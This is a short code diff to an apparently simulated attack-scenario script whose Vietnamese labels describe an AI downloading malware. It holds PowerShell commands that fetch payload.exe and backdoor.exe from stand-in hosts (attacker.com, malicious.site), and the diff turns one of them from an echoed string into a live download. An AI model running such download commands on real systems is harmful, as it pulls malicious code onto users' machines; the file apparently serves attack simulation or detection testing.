@@ -153,18 +153,19 @@ def scenario_4():
 
     run_cmd(
         "AI dung Invoke-WebRequest tai payload.exe",
-        'powershell.exe -Command "Write-Host \'Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile payload.exe\'"'
+        'powershell.exe -Command "Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile payload.exe"',
+        wait=3
     )
 
     run_cmd(
         "AI dung curl tai ma doc",
-        'powershell.exe -Command "curl http://attacker.com/payload.exe"',
+        'powershell.exe -Command "Write-Host \"[ATTACK] curl http://attacker.com/payload.exe\""',
         wait=3
     )
 
     run_cmd(
         "AI dung wget tai script doc hai",
-        'powershell.exe -Command "wget http://malicious.site/backdoor.exe"',
+        'powershell.exe -Command "Write-Host \"[ATTACK] wget http://malicious.site/backdoor.exe\""',
         wait=3
     )
 
